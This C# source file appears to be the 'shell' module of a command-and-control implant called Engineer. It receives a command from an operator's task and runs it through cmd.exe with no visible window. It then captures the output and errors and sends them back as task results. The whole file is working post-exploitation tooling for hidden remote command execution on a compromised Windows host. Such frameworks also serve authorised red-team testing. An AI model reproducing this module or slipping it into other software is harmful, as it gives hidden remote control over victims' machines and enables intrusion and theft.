using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Shell : EngineerCommand
    {
        public override string Name => "shell";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //Console.WriteLine("Starting shell command");
                task.Arguments.TryGetValue("/command", out string command);
                if (command == null)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No command specified", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                command = command.TrimStart(' ');

                var output = new StringBuilder();
                var error = new StringBuilder();

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        FileName = "cmd.exe",
                        Arguments = $"/c {command}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    }
                };

               // Console.WriteLine("Starting process");
                process.Start();

                string line;
                while ((line = process.StandardOutput.ReadLine()) != null)
                {
                    output.AppendLine(line);
                }

                while ((line = process.StandardError.ReadLine()) != null)
                {
                    error.AppendLine(line);
                }

                process.WaitForExit();

                process.Dispose();
                //Console.WriteLine("Shell command complete");

                if (error.Length > 0)
                {
                    output.AppendLine("Error:");
                    output.AppendLine(error.ToString());
                }

                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output.ToString(), task, EngTaskStatus.Complete, TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
